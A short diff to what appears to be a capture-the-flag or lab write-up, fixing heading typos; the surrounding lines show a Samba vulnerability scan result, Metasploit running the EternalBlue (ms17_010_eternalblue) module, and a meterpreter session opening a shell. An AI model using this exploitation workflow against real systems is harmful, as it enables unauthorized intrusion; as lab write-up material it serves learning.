@@ -134,7 +134,7 @@ Host script results:
 |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
 ```
 
-## Expoitation
+## Expoitation:
 We'll use `msfconsole` for exploitation.
 
 ```console                                                                                                          
@@ -303,7 +303,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 meterpreter >
 ```
 
-##Flags:
+## Flags:
 Firstly verify the initial foothold.
 ```console
 meterpreter > shell
